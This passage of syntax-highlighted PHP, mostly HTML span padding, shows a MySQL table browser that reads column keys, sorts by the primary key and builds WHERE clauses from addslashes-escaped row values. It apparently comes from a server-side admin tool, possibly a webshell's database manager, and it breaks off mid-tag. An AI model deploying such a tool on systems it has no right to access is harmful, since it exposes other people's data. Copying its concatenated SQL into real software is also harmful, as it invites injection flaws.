<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb[$row['Field']]['Key'] = $row['Key<span style=\"text-decoration: underline;\">'];</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb[$row['Field']]['Extra'] = $row['E<span style=\"text-decoration: underline;\">xtra'];</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($row['Key'] == 'UNI' || $row['Key'] <span style=\"text-decoration: underline;\">== 'PRI') {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $keyfied = $row['Field'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   /*********************/<span style=\"color: #f99157; background-color: #515151;\">                     </span><span style=\"color: #f99157; background-color: #515151; text-decoration: underline;\">            </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($keyfied &amp;&amp; strtolower(substr($query,0,1<span style=\"text-decoration: underline;\">3)) == 'select * from') {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $query = str_replace(\" LIMIT \", \" order <span style=\"text-decoration: underline;\">by $keyfied DESC LIMIT \", $query);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q($query);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($multipage);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;table border=\"0\" cellpadding=\"3\" cellspa<span style=\"text-decoration: underline;\">cing=\"0\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fieldnum = @mysql_num_fields($result);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($i=0;$i&lt;$fieldnum;$i++){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $name = @mysql_field_name($result, $i);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $type = @mysql_field_type($result, $i);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $len = @mysql_field_len($result, $i);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)<span style=\"text-decoration: underline;\">\".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '').\"&lt;/span&gt;&lt;/td&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($mn = @mysql_fetch_assoc($result)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $thisbg = bg();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.$thisbg.'\" onmouseover=\"<span style=\"text-decoration: underline;\">this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $where = $tmp = $b1 = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($mn as $key=&gt;$inside){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($inside) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;<span style=\"text-decoration: underline;\">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($rowdb[$key]['Key'] == 'UNI'<span style=\"text-decoration: underline;\"> || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $where = $key.\"='\".addslashe<span style=\"text-decoration: underline;\">s($inside).\"'\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   break;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $where .= $tmp.$key.\"='\".addslas<span style=\"text-decoration: underline;\">hes($inside).\"'\";</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tmp = ' AND ';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //&#35835;&#21462;&#35760;&#24405;&#29992;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($mn as $key=&gt;$inside){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: 